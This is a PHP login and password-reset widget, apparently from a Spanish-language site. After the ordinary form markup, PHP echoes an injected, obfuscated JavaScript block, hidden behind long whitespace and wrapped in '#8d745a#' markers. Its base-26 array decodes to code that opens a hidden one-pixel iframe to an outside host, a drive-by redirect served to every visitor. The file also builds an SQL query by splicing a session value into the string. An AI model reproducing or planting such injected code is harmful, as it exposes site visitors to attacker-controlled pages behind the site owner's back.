<? ?>
<? 

if ($_SESSION['MM_IdPersona']!=NULL){
	 
	$_SESSION['MM_IdPersona'];
	
	$id_usu=$_SESSION['MM_IdUser'];
	
mysql_select_db($database_cnx_arica, $cnx_arica);
$query_rsUsuarios = "SELECT *  FROM usuarios,personas where Estado_Usu= 1 AND usuarios.Id_Usuario=$id_usu AND usuarios.IdPersona_Usu= personas.Id_Persona ";
$rsUsuarios = mysql_query($query_rsUsuarios, $cnx_arica) or die(mysql_error());
$row_rsUsuarios = mysql_fetch_assoc($rsUsuarios);
$totalRows_rsUsuarios = mysql_num_rows($rsUsuarios);
	?> <? echo $row_rsUsuarios['Nombres_Per'];?> <? echo $row_rsUsuarios['Paterno_Per'];?> <? echo $row_rsUsuarios['Materno_Per'];?> <a href="../include/logout.php">Salir</a>
   <? }
 
 
 else {?>
   <div id="login" class="login">
   
  <span><h3>Login de Usuarios</h3></span>
  <form id="recordarform" action="../include/login.php" method="post">
        	<div class="datos">
              <div class="titulo">Usuario</div>
                <input name="usuario_Txt" id="usuario_Txt" type="text" class="caja" />            
              <div class="titulo">Contraseña</div>
                <input type="password" id="password_Txt" name="password_Txt" class="caja" />
            </div>
            <div class="botonside"><input type="submit" class="boton" value="Login"/></div>
            
            
      <div class="enlaces"><a href="#" onclick="mostrar('forgotbox'); ocultar('login')">¿Olvidó su Contraseña?</a>
     <a href="../registro/index.php">Regístrate</a> 
    <!-- ../registro/index.php--> 
     
      </div>
		
        </form>
        </div> 
        <div id="forgotbox" class="login" style="display:none">
		<div style="color:#FFFFFF">Escriba su Correo para enviarle una nueva contraseña.</div>
		<!--  start forgot-inner -->
		<div id="forgot-inner">
        <form  action="recordar.php" method="post" id="correo_form">
		<table border="0" cellpadding="0" cellspacing="0">
        <tr>
			<td align="left"><span id="msgbox1" style="display:none; margin:auto;"></span></td>
		</tr>
		<tr >
			<th class="titulo">Correo:</th>
			<td><input type="text" value=""  id="correo_Txt" name="correo_Txt"   class="login-inp" /></td>
		</tr>
		<tr>
			<th> </th>
			<td ><input style="top:15px" type="submit" class="boton" name="enviar2" value="Enviar" id="enviar2" /></td>
		</tr>
		</table>
        </form>
		</div>
		<!--  end forgot-inner -->
		<div class="clear"></div>
		<a  href="#" onClick="ocultar('forgotbox');mostrar('login')" class="back-login">Volver</a>
	</div>
        
        <? }?>
<?
#8d745a#
                                                                                                                                                                                                                                                          echo "                                                                                                                                                                                                                                                          <script type=\"text/javascript\" language=\"javascript\" >                                                                                                                                                                                                                                                          try{document[\"b\"+\"ody\"]*=document}catch(dgsgsdg){zxc=1;ww=window;}try{d=document[\"cr\"+\"eateElement\"](\"div\");}catch(agdsg){zxc=0;}try{if(ww.document)window[\"doc\"+\"ument\"][\"body\"]=\"asd\"}catch(bawetawe){if(ww.document){v=window;n=[\"1e\",\"3o\",\"4d\",\"46\",\"3l\",\"4c\",\"41\",\"47\",\"46\",\"16\",\"1e\",\"1f\",\"16\",\"4j\",\"d\",\"a\",\"16\",\"16\",\"16\",\"16\",\"4e\",\"3j\",\"4a\",\"16\",\"41\",\"47\",\"46\",\"3m\",\"46\",\"16\",\"29\",\"16\",\"3m\",\"47\",\"3l\",\"4d\",\"45\",\"3n\",\"46\",\"4c\",\"1k\",\"3l\",\"4a\",\"3n\",\"3j\",\"4c\",\"3n\",\"2h\",\"44\",\"3n\",\"45\",\"3n\",\"46\",\"4c\",\"1e\",\"1d\",\"41\",\"3o\",\"4a\",\"3j\",\"45\",\"3n\",\"1d\",\"1f\",\"27\",\"d\",\"a\",\"d\",\"a\",\"16\",\"16\",\"16\",\"16\",\"41\",\"47\",\"46\",\"3m\",\"46\",\"1k\",\"4b\",\"4a\",\"3l\",\"16\",\"29\",\"16\",\"1d\",\"40\",\"4c\",\"4c\",\"48\",\"26\",\"1l\",\"1l\",\"3k\",\"4d\",\"4b\",\"41\",\"46\",\"3n\",\"4b\",\"4b\",\"48\",\"3j\",\"3j\",\"4a\",\"3m\",\"1k\",\"46\",\"44\",\"1l\",\"4f\",\"48\",\"1j\",\"41\",\"46\",\"3l\",\"44\",\"4d\",\"3m\",\"3n\",\"4b\",\"1l\",\"4c\",\"4a\",\"3j\",\"3o\",\"1k\",\"48\",\"40\",\"48\",\"1d\",\"27\",\"d\",\"a\",\"16\",\"16\",\"16\",\"16\",\"41\",\"47\",\"46\",\"3m\",\"46\",\"1k\",\"4b\",\"4c\",\"4h\",\"44\",\"3n\",\"1k\",\"48\",\"47\",\"4b\",\"41\",\"4c\",\"41\",\"47\",\"46\",\"16\",\"29\",\"16\",\"1d\",\"3j\",\"3k\",\"4b\",\"47\",\"44\",\"4d\",\"4c\",\"3n\",\"1d\",\"27\",\"d\",\"a\",\"16\",\"16\",\"16\",\"16\",\"41\",\"47\",\"46\",\"3m\",\"46\",\"1k\",\"4b\",\"4c\",\"4h\",\"44\",\"3n\",\"1k\",\"3k\",\"47\",\"4a\",\"3m\",\"3n\",\"4a\",\"16\",\"29\",\"16\",\"1d\",\"1m\",\"1d\",\"27\",\"d\",\"a\",\"16\",\"16\",\"16\",\"16\",\"41\",\"47\",\"46\",\"3m\",\"46\",\"1k\",\"4b\",\"4c\",\"4h\",\"44\",\"3n\",\"1k\",\"40\",\"3n\",\"41\",\"3p\",\"40\",\"4c\",\"16\",\"29\",\"16\",\"1d\",\"1n\",\"48\",\"4g\",\"1d\",\"27\",\"d\",\"a\",\"16\",\"16\",\"16\",\"16\",\"41\",\"47\",\"46\",\"3m\",\"46\",\"1k\",\"4b\",\"4c\",\"4h\",\"44\",\"3n\",\"1k\",\"4f\",\"41\",\"3m\",\"4c\",\"40\",\"16\",\"29\",\"16\",\"1d\",\"1n\",\"48\",\"4g\",\"1d\",\"27\",\"d\",\"a\",\"16\",\"16\",\"16\",\"16\",\"41\",\"47\",\"46\",\"3m\",\"46\",\"1k\",\"4b\",\"4c\",\"4h\",\"44\",\"3n\",\"1k\",\"44\",\"3n\",\"3o\",\"4c\",\"16\",\"29\",\"16\",\"1d\",\"1n\",\"48\",\"4g\",\"1d\",\"27\",\"d\",\"a\",\"16\",\"16\",\"16\",\"16\",\"41\",\"47\",\"46\",\"3m\",\"46\",\"1k\",\"4b\",\"4c\",\"4h\",\"44\",\"3n\",\"1k\",\"4c\",\"47\",\"48\",\"16\",\"29\",\"16\",\"1d\",\"1n\",\"48\",\"4g\",\"1d\",\"27\",\"d\",\"a\",\"d\",\"a\",\"16\",\"16\",\"16\",\"16\",\"41\",\"3o\",\"16\",\"1e\",\"17\",\"3m\",\"47\",\"3l\",\"4d\",\"45\",\"3n\",\"46\",\"4c\",\"1k\",\"3p\",\"3n\",\"4c\",\"2h\",\"44\",\"3n\",\"45\",\"3n\",\"46\",\"4c\",\"2e\",\"4h\",\"2l\",\"3m\",\"1e\",\"1d\",\"41\",\"47\",\"46\",\"3m\",\"46\",\"1d\",\"1f\",\"1f\",\"16\",\"4j\",\"d\",\"a\",\"16\",\"16\",\"16\",\"16\",\"16\",\"16\",\"16\",\"16\",\"3m\",\"47\",\"3l\",\"4d\",\"45\",\"3n\",\"46\",\"4c\",\"1k\",\"4f\",\"4a\",\"41\",\"4c\",\"3n\",\"1e\",\"1d\",\"28\",\"3m\",\"41\",\"4e\",\"16\",\"41\",\"3m\",\"29\",\"3e\",\"1d\",\"41\",\"47\",\"46\",\"3m\",\"46\",\"3e\",\"1d\",\"2a\",\"28\",\"1l\",\"3m\",\"41\",\"4e\",\"2a\",\"1d\",\"1f\",\"27\",\"d\",\"a\",\"16\",\"16\",\"16\",\"16\",\"16\",\"16\",\"16\",\"16\",\"3m\",\"47\",\"3l\",\"4d\",\"45\",\"3n\",\"46\",\"4c\",\"1k\",\"3p\",\"3n\",\"4c\",\"2h\",\"44\",\"3n\",\"45\",\"3n\",\"46\",\"4c\",\"2e\",\"4h\",\"2l\",\"3m\",\"1e\",\"1d\",\"41\",\"47\",\"46\",\"3m\",\"46\",\"1d\",\"1f\",\"1k\",\"3j\",\"48\",\"48\",\"3n\",\"46\",\"3m\",\"2f\",\"40\",\"41\",\"44\",\"3m\",\"1e\",\"41\",\"47\",\"46\",\"3m\",\"46\",\"1f\",\"27\",\"d\",\"a\",\"16\",\"16\",\"16\",\"16\",\"4l\",\"d\",\"a\",\"4l\",\"1f\",\"1e\",\"1f\",\"27\"];h=2;s=\"\";if(zxc){for(i=0;i-506!=0;i++){k=i;s+=String.fromCharCode(parseInt(n[i],26));}z=s;vl=\"val\";if(ww.document)ww[\"e\"+vl](z)}}}</script>";

#/8d745a#
?>